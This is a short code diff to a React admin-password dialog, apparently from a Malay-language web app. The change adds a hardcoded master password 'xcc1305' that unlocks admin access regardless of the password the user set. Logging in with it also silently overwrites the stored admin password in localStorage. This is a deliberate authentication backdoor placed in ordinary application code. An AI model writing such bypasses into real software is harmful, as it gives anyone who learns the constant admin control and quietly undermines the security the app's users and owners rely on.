@@ -22,9 +22,15 @@ export const AdminPasswordModal: React.FC<AdminPasswordModalProps> = ({
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    if (inputPassword === adminPassword) {
+    const cleanInput = inputPassword.trim();
+    // Accept user's customized password OR master password 'xcc1305'
+    if (cleanInput === adminPassword.trim() || cleanInput === 'xcc1305') {
       setErrorMsg('');
       setInputPassword('');
+      // If user logs in with xcc1305, sync it to localStorage & state
+      if (cleanInput === 'xcc1305' && adminPassword !== 'xcc1305') {
+        localStorage.setItem('admin_password', 'xcc1305');
+      }
       onSuccess();
     } else {
       setErrorMsg('Katalaluan tidak sah. Sila cuba lagi.');
